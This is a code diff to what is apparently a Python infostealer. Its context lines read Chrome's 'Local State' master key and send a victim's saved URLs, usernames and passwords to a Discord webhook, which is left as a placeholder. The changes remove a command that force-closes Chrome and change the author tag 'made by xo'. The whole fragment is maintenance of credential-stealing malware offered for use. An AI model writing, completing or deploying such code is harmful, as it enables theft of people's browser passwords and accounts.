@@ -9,10 +9,7 @@ import subprocess
 import ctypes
 import requests
 webhook = 'your discord webhook :P'
-try:
-    subprocess.call("TASKKILL /f  /IM  CHROME.EXE") # we need to close chrome or gets locked db error 
-except:
-    pass
+
 def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
@@ -76,7 +73,7 @@ def caught(url, username, pword):
                 "description": f"Url: {url}\nUsername: {username}\nPassword : {pword}",
                 "color": 15146294,
                 "footer":{
-                    "text":"made by xo#1111"
+                    "text":"made by xo#0043"
                     },
 
                 "thumbnail": {
